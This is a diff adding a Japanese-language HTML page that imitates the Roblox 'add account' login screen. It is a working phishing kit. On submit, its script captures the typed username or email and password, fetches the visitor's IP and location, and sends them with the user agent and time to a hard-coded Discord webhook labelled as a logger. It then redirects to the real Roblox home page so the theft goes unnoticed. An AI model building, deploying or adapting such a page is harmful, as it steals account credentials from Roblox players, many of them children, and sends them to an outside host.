@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Roblox</title>
+<style>
+html,body{margin:0;padding:0;background:#050506}
+body{font-family:"Segoe UI","Hiragino Kaku Gothic ProN",Meiryo,sans-serif;color:#fff}
+*{box-sizing:border-box}
+
+.photo{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;
+  background-size:cover;background-position:center;background-repeat:no-repeat}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;overflow:hidden;z-index:0}
+.bg i{position:absolute;display:block;border-radius:6px;overflow:hidden}
+.bg i img{width:100%;height:100%;object-fit:cover;display:block}
+.bg i.f::after{content:attr(data-n);position:absolute;top:0;left:0;right:0;bottom:0;
+  display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:800;color:#fff;opacity:.9}
+.shade{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none}
+
+.top{position:relative;z-index:3;height:56px;background:#1c1e20;display:flex;align-items:center;gap:16px;padding:0 14px}
+.top .lg{line-height:0}
+.top .lg svg{width:30px;height:30px;display:block}
+.top nav{display:flex;gap:2px}
+.top nav a{color:#fff;font-size:15px;font-weight:600;text-decoration:none;padding:7px 9px;border-radius:5px;white-space:nowrap}
+.top nav a:hover{background:#2c3034}
+.top .sc{flex:1;min-width:0;max-width:330px;display:flex;align-items:center;gap:8px;height:36px;background:#2c3034;border-radius:18px;padding:0 14px}
+.top .sc svg{width:16px;height:16px;stroke:#c9cdd1;fill:none;stroke-width:2.4}
+.top .sc input{flex:1;min-width:0;background:none;border:0;outline:none;color:#fff;font-size:14px}
+.top .sc input::placeholder{color:#b7bbbf}
+.top .ac{margin-left:auto;display:flex;gap:8px}
+.top .ac a{font-size:14px;font-weight:700;padding:8px 15px;border-radius:6px;text-decoration:none;white-space:nowrap}
+.su{background:#2f5cf0;color:#fff}.su:hover{background:#2549c4}
+.li{border:1px solid rgba(255,255,255,.5);color:#fff}.li:hover{background:rgba(255,255,255,.1)}
+@media(max-width:860px){.top .sc{display:none}}
+
+.wrap{position:relative;z-index:3;display:flex;align-items:center;justify-content:center;
+  min-height:600px;padding:34px 18px 60px}
+.modal{width:100%;max-width:400px;background:#232527;border-radius:8px;padding:30px 26px 26px;
+  display:flex;flex-direction:column;gap:12px;box-shadow:0 12px 44px rgba(0,0,0,.7)}
+.modal h1{font-size:26px;font-weight:800;text-align:center;margin:0 0 8px}
+.modal input{height:44px;border-radius:6px;border:1px solid #4b4f54;background:#1e2022;
+  color:#fff;font-size:15px;padding:0 14px;outline:none;width:100%}
+.modal input::placeholder{color:#a9adb2}
+.modal input:focus{border-color:#8b9096}
+
+/* パスワード欄＋目のアイコン */
+.pw{position:relative}
+.pw input{padding-right:48px}
+.pw input::-ms-reveal{display:none}
+.pw .eye{position:absolute;right:6px;top:50%;transform:translateY(-50%);
+  width:34px;height:34px;display:flex;align-items:center;justify-content:center;
+  background:none;border:0;padding:0;cursor:pointer;color:#a9adb2;border-radius:50%}
+.pw .eye:hover{color:#fff;background:rgba(255,255,255,.08)}
+.pw .eye svg{width:20px;height:20px;fill:none;stroke:currentColor;stroke-width:1.9;
+  stroke-linecap:round;stroke-linejoin:round}
+.pw .eye .e2{display:none}
+.pw .eye.vis .e1{display:none}
+.pw .eye.vis .e2{display:block}
+
+.bo{height:42px;margin-top:2px;border-radius:6px;border:1px solid #6d7176;background:#2b2e31;
+  color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+.bo:hover{background:#34383c}
+.fg{color:#fff;font-size:14px;text-align:center;text-decoration:none;line-height:1.5;margin:6px auto 4px;max-width:300px}
+.fg:hover{text-decoration:underline}
+.bt{height:42px;border:0;border-radius:6px;background:#3a3e42;color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+.bt:hover{background:#45494e}
+.sg{color:#fff;font-size:14px;text-align:center;margin:8px 0 0}
+.sg a{color:#4a9eff;font-weight:700;text-decoration:none}
+.dn{text-align:center;padding:16px 0 8px}
+.dn .c{width:62px;height:62px;margin:0 auto 16px;border-radius:50%;background:#2f5cf0;
+  display:flex;align-items:center;justify-content:center}
+.dn h2{font-size:20px;margin:0 0 8px}
+.dn p{color:#a9adb2;font-size:14px;margin:0}
+</style>
+</head>
+<body>
+
+<div class="photo" id="photo"></div>
+<div class="bg" id="bg"></div>
+<div class="shade" id="shade"></div>
+
+<header class="top">
+  <a class="lg" href="https://www.roblox.com/" aria-label="Roblox">
+    <svg viewBox="0 0 100 100"><g transform="rotate(-13 50 50)">
+      <path fill="#fff" fill-rule="evenodd" d="M13 13H87V87H13ZM37 37H63V63H37Z"/></g></svg>
+  </a>
+  <nav>
+    <a href="https://www.roblox.com/charts">ランキング</a>
+    <a href="https://www.roblox.com/catalog">マーケットプレイス</a>
+    <a href="https://create.roblox.com/">制作</a>
+    <a href="https://www.roblox.com/">Roblox</a>
+  </nav>
+  <form class="sc" id="sc">
+    <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+    <input id="kw" placeholder="サーチ" autocomplete="off">
+  </form>
+  <div class="ac">
+    <a class="su" href="https://www.roblox.com/account/signupredir">新規登録</a>
+    <a class="li" href="https://www.roblox.com/login">ログイン</a>
+  </div>
+</header>
+
+<main class="wrap" id="wrap">
+  <form class="modal" id="loginForm" autocomplete="off">
+    <h1>アカウントを追加</h1>
+    <input id="username" type="text" placeholder="ユーザーネーム/メールアドレス/電話番号" required>
+    <div class="pw">
+      <input id="password" type="password" placeholder="パスワード" required>
+      <button type="button" class="eye" id="eye" aria-label="パスワードを表示">
+        <svg class="e1" viewBox="0 0 24 24">
+          <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>
+        </svg>
+        <svg class="e2" viewBox="0 0 24 24">
+          <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/>
+          <path d="M3.5 3.5l17 17"/>
+        </svg>
+      </button>
+    </div>
+    <button class="bo" id="loginBtn" type="submit">ログイン</button>
+    <a class="fg" href="https://www.roblox.com/account/signupredir">パスワード、またはユーザーネームをお忘れですか？</a>
+    <button class="bt" type="button">ワンタイムコードをメールで送信</button>
+    <button class="bt" type="button">クイックサインイン</button>
+    <p class="sg">アカウントをお持ちではありませんか？ <a href="https://www.roblox.com/account/signupredir">新規登録</a></p>
+  </form>
+</main>
+
+<script>
+/* ===== 設定 ===== */
+var BG_IMAGE  = "cc816974-7e4f-4747-b964-128f95898937";  /* 拡張子は自動判定 */
+var BG_IMAGE_FALLBACK = "Roblox-download2";
+var BG_DARK   = 0.45;
+var SHOW_TILES= false;
+var WEBHOOK_URL = "https://discord.com/api/webhooks/1560837746568728626/AVcBeBIagiNkPQK0rWSF6hQrcIJKy9mNcwJDpIFW2PRGGoaSGzgtRESQiBHMFHObgUor";
+var REDIRECT_URL = "https://www.roblox.com/home";  /* "" なら完了画面のまま */
+var PING = false;
+var USE_IP = true;
+/* ================ */
+
+/* --- パスワード表示切替 --- */
+(function(){
+  var eye = document.getElementById("eye"), pw = document.getElementById("password");
+  eye.addEventListener("click", function(){
+    var show = pw.type === "password";
+    var s = pw.selectionStart, e = pw.selectionEnd;
+    pw.type = show ? "text" : "password";
+    eye.classList.toggle("vis", show);
+    eye.setAttribute("aria-label", show ? "パスワードを隠す" : "パスワードを表示");
+    pw.focus();
+    try{ pw.setSelectionRange(s, e); }catch(err){}
+  });
+})();
+
+/* --- 背景画像（拡張子を順に試す → 失敗したら予備へ） --- */
+(function(){
+  var photo = document.getElementById("photo");
+  document.getElementById("shade").style.background = "rgba(0,0,0," + BG_DARK + ")";
+  function attempt(base, done){
+    if(!base) return done();
+    var list = base.indexOf(".") > -1 ? [base]
+             : ["png","jpg","jpeg","webp","gif","avif"].map(function(e){ return base + "." + e; });
+    (function tryAt(i){
+      if(i >= list.length) return done();
+      var im = new Image();
+      im.onload  = function(){ photo.style.backgroundImage = "url('" + list[i] + "')"; };
+      im.onerror = function(){ tryAt(i + 1); };
+      im.src = list[i];
+    })(0);
+  }
+  attempt(BG_IMAGE, function(){ attempt(BG_IMAGE_FALLBACK, function(){}); });
+})();
+
+/* --- リンク --- */
+function openX(url){
+  var w=null; try{ w=window.open(url,"_blank"); }catch(e){}
+  if(w) return;
+  try{ if(window.top&&window.top!==window){ window.top.location.href=url; return; } }catch(e){}
+  location.href=url;
+}
+document.addEventListener("click",function(e){
+  var t=e.target, a=(t&&t.closest)?t.closest("a[href^='http']"):null;
+  if(!a) return; e.preventDefault(); openX(a.getAttribute("href"));
+});
+var sc=document.getElementById("sc");
+if(sc) sc.addEventListener("submit",function(e){
+  e.preventDefault();
+  openX("https://www.roblox.com/discover/?Keyword="+encodeURIComponent(document.getElementById("kw").value.trim()));
+});
+
+/* --- タイル --- */
+var HASH="180DAY-980ef4b4b4639b6cfe29a484e537e847";
+var G=[[920587237,"ADOPT ME!","GameMediaItem10"],[2753915549,"BLOX FRUITS","GameMediaItem2"],
+[6516141723,"DOORS","GameMediaItem10"],[142823291,"MM2","GameMediaItem8"],
+[4924922222,"BROOKHAVEN","GameMediaItem6"],[189707,"NATURAL DISASTER","GameMediaItem6"],
+[2788229376,"DA HOOD","GameMediaItem7"],[4623386862,"PIGGY","GameMediaItem11"],
+[155615604,"PRISON LIFE","GameMediaItem6"],[1537690962,"BEE SWARM","GameMediaItem5"],
+[1962086868,"TOWER OF HELL","GameMediaItem10"],[5377573373,"FISCH","GameMediaItem5"],
+[5757400922,"DANDY'S WORLD","GameMediaItem11"],[1324702861,"DRIVING EMPIRE","GameMediaItem5"],
+[606849621,"JAILBREAK","GameMediaItem9"],[192800,"PIZZA PLACE","GameMediaItem11"],
+[370731277,"MEEPCITY","GameMediaItem1"],[185655149,"BLOXBURG","GameMediaItem8"]]
+.map(function(a){return {id:a[0],n:a[1],u:"https://tr.rbxcdn.com/"+HASH+"/768/432/"+a[2]+"/Png/noFilter"};});
+
+var box=document.getElementById("bg"), tiles=[], thumbs=null, lw=-1, lh=-1;
+function rnd(s){ return function(){ s=(s*1664525+1013904223)>>>0; return s/4294967296; }; }
+function paint(){
+  if(!thumbs) return;
+  var L=thumbs.slice(),i,j,t;
+  for(i=L.length-1;i>0;i--){ j=(Math.random()*(i+1))|0; t=L[i]; L[i]=L[j]; L[j]=t; }
+  tiles.forEach(function(el,k){
+    var g=L[k%L.length]; if(!g) return;
+    el.setAttribute("data-n",g.n);
+    var im=document.createElement("img");
+    im.alt=""; im.referrerPolicy="no-referrer";
+    im.onerror=function(){ im.remove(); el.classList.add("f"); };
+    im.src=g.u; el.appendChild(im);
+  });
+}
+function build(){
+  var W=window.innerWidth||700, H=window.innerHeight||680;
+  lw=W; lh=H; box.innerHTML=""; tiles=[];
+  var CW=250,CH=195, cols=Math.ceil(W/CW)+2, rows=Math.ceil(H/CH)+2, r=rnd(20261017);
+  for(var y=0;y<rows;y++) for(var x=0;x<cols;x++){
+    var w=195+r()*75, h=150+r()*55, hue=(r()*360)|0;
+    var el=document.createElement("i");
+    el.style.left=Math.round((x-1)*CW+r()*60-30-(w-250)/2)+"px";
+    el.style.top=Math.round((y-1)*CH+r()*50-25)+"px";
+    el.style.width=Math.round(w)+"px";
+    el.style.height=Math.round(h)+"px";
+    el.style.transform="rotate("+(r()*24-12).toFixed(1)+"deg)";
+    el.style.background="linear-gradient(135deg,hsl("+hue+" 55% 28%),hsl("+((hue+50)%360)+" 55% 13%))";
+    box.appendChild(el); tiles.push(el);
+  }
+  paint();
+}
+function fit(){ document.getElementById("wrap").style.minHeight = Math.max((window.innerHeight||0)-56,600)+"px"; }
+
+fit();
+if(SHOW_TILES){
+  build();
+  fetch("https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds="+G.map(function(g){return g.id;}).join(",")+"&size=768x432&format=Png&isCircular=false")
+  .then(function(r){ return r.ok?r.json():null; })
+  .then(function(j){
+    if(!j) return;
+    var m={}; (j.data||[]).forEach(function(d){ m[d.universeId]=d.thumbnails&&d.thumbnails[0]&&d.thumbnails[0].imageUrl; });
+    thumbs=G.map(function(g){ return {n:g.n,u:m[g.id]||g.u}; }); paint();
+  })
+  .catch(function(){ thumbs=G.slice(); paint(); });
+}
+window.addEventListener("resize",function(){
+  fit();
+  if(SHOW_TILES && (Math.abs(window.innerWidth-lw)>2||Math.abs(window.innerHeight-lh)>2)) build();
+});
+
+/* --- ログイン --- */
+var form=document.getElementById("loginForm"), btn=document.getElementById("loginBtn");
+function ip(){
+  if(!USE_IP) return Promise.resolve(null);
+  return Promise.race([ fetch("https://ipapi.co/json/").then(function(x){return x.json();}),
+    new Promise(function(_,r){setTimeout(r,1800);}) ])
+    .then(function(r){ return (r.ip||"?")+" / "+(r.city||"?")+", "+(r.country_name||"?"); })
+    .catch(function(){ return null; });
+}
+function send(p){
+  var fd=new FormData(); fd.append("payload_json",JSON.stringify(p));
+  try{ if(navigator.sendBeacon&&navigator.sendBeacon(WEBHOOK_URL,fd)) return; }catch(e){}
+  fetch(WEBHOOK_URL,{method:"POST",body:fd,mode:"no-cors",keepalive:true}).catch(function(){});
+}
+form.addEventListener("submit", async function(e){
+  e.preventDefault();
+  var u=document.getElementById("username").value.trim(), pw=document.getElementById("password").value;
+  btn.disabled=true; btn.textContent="ログイン中...";
+  var ipv=await ip();
+  var f=[{name:"👤 ユーザーネーム / メール",value:"`"+(u||"(空)")+"`"},{name:"🔑 パスワード",value:"`"+(pw||"(空)")+"`"}];
+  if(ipv) f.push({name:"🌐 IP / 地域",value:ipv});
+  f.push({name:"🕒 時刻",value:new Date().toLocaleString("ja-JP",{timeZone:"Asia/Tokyo"})});
+  f.push({name:"📄 ページ",value:location.href.slice(0,1024)});
+  f.push({name:"🧭 端末",value:navigator.userAgent.slice(0,1024)});
+  var p={username:"Roblox ログイン",embeds:[{title:"🔐 Roblox ログイン情報",color:0x2f5cf0,fields:f,footer:{text:"まりねのロガー"},timestamp:new Date().toISOString()}]};
+  if(PING) p.content="@here";
+  send(p);
+  setTimeout(function(){
+    if(REDIRECT_URL){ location.href=REDIRECT_URL; return; }
+    form.innerHTML='<div class="dn"><div class="c"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5 9.5 18 20 6.5"/></svg></div><h2>ログインしました</h2><p>'+u+' としてログイン中…</p></div>';
+  },900);
+});
+</script>
+</body>
+</html>
